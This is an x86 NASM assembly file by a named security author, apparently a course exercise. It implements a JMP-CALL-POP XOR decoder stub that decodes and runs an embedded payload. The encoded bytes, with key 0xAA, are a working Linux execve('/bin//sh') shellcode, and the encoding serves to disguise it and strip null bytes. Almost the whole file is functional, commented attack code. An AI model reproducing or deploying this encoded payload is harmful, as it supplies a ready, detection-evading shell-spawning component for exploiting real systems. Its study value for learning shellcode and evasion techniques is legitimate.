; Filename: xor_decoder_marker.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: XOR Decoder with variable length payload

global _start            

section .text
_start:
    ; JMP-CALL-POP allows the application to be written without any hardcoded addresses (unlike 'mov ecx, Shellcode')
    jmp short call_decoder

decoder:
    ; Move the pointer to the encoded Shellcode into ESI off of the stack
    pop esi

decode:
    ; XOR the byte pointed to by ESI by 0xAA - this was the value chosen during encoding, but can be modified
    xor byte [esi], 0xAA

    ; If the zero flag is set (this will only occur if [ESI] xor 0xAA is zero, so only when a null byte was encoded), then jump to the shellcode
    ; This is utilized to mark the end of the shellcode, so that a length variable is not needed
    jz Shellcode

    ; Increment ESI to decode the next byte of shellcode
    inc esi

    ; Loop back through decode
    jmp short decode

call_decoder:
    call decoder

    ; The encoded shellcode
    Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa